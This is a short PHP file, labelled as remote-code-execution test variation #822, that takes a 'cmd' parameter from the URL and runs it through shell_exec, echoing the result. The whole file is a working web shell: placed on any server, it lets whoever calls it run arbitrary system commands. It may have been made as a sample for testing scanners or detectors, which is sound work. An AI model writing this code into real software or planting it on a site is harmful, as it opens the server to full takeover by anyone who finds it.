<?php
// RCE test variation #822
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>